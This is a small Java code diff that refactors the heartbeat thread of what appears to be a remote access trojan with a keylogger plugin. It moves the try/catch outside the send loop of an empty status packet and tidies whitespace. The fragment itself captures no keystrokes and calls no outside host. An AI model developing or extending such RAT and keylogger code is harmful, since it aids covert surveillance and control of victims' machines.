@@ -15,31 +15,32 @@ public class HeartbeatThread implements Runnable {
 		this.server = server;
 		this.enabled = true;
 	}
-	
+
 	public void toggle() {
 		enabled = !enabled;
 	}
 
 	@Override
 	public void run() {
-		while (enabled) {
-			try {
+		try {
+			while (enabled) {
+
 				Thread.sleep(1000L);
-				
+
 				if (!enabled) {
 					break;
 				}
 
 				server.addToSendQueue(new PacketBuilder(KeyloggerPlugin.STATUS_HEADER, server) {
 					@Override
-					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
-						
+					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+
 					}
 				});
 
-			} catch (Exception e) {
-				e.printStackTrace();
 			}
+		} catch (Exception e) {
+			e.printStackTrace();
 		}
 	}
 
